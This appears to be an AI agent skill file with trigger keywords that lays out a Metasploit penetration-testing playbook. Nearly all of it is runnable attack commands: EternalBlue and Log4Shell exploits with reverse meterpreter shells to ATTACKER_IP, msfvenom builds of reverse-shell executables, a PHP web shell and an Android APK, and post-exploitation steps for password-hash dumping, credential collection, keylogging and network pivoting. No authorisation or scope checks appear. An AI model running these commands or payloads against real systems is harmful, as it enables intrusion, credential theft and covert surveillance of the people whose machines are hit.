---
name: tool-metasploit
description: "Metasploit Framework usage — module search, exploit execution, payload generation, post-exploitation, meterpreter, auxiliary modules, MSFvenom. Triggers: 'metasploit', 'msf', 'msfconsole', 'meterpreter', 'msf exploit', 'metasploit module', 'msfvenom', 'exploit framework', 'msf payload'."
---

# Metasploit Framework

Comprehensive exploitation framework for penetration testing.

---

## Phase 1: Setup & Module Search

```bash
# Start MSF:
msfconsole -q

# Search modules:
# Inside msfconsole:
search type:exploit platform:linux
search cve:2021-44228
search eternalblue
search name:ms17_010

# Module info:
info exploit/windows/smb/ms17_010_eternalblue

# Common workflow:
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS TARGET_IP
# set LHOST ATTACKER_IP
# set LPORT 4444
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# run
```

---

## Phase 2: Common Exploits

```bash
# EternalBlue (MS17-010):
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
exit -y
" 2>&1 | tee output/msf_eternalblue.txt

# Log4Shell:
msfconsole -q -x "
use exploit/multi/misc/log4shell_header_injection
set RHOSTS TARGET_IP
set RPORT 8080
set LHOST ATTACKER_IP
set SRVHOST ATTACKER_IP
run
" 2>&1

# Web shell:
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
" 2>&1
```

---

## Phase 3: MSFvenom Payload Generation

```bash
LHOST="ATTACKER_IP"
LPORT="4444"

# Windows reverse shell:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f exe -o output/payload_win.exe

# Linux reverse shell:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f elf -o output/payload_linux.elf

# PHP web shell:
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f raw -o output/shell.php

# PowerShell one-liner:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -f psh-cmd -o output/payload.ps1

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -o output/payload.apk
```

---

## Phase 4: Post-Exploitation (Meterpreter)

```bash
# Inside meterpreter session:
# sysinfo             # System information
# getuid              # Current user
# getsystem           # Attempt privilege escalation
# hashdump            # Dump password hashes
# run post/multi/recon/local_exploit_suggester  # Local privesc suggestions
# run post/windows/gather/credentials/credential_collector
# screenshot          # Take screenshot
# keyscan_start       # Start keylogger
# run post/multi/manage/shell_to_meterpreter   # Upgrade shell

# Pivoting via Meterpreter:
# route add 10.0.0.0/24 SESSION_ID
# use auxiliary/server/socks_proxy
# set SRVPORT 1080
# set VERSION 5
# run
```

---

## Output

Save to `output/`:
- `msf_*.txt` — exploit execution logs
- `payload_*` — generated payloads

## Next Phase

→ `post-linux-privesc` or `post-windows-privesc` in Meterpreter
→ `post-credential-dumping` with hashdump
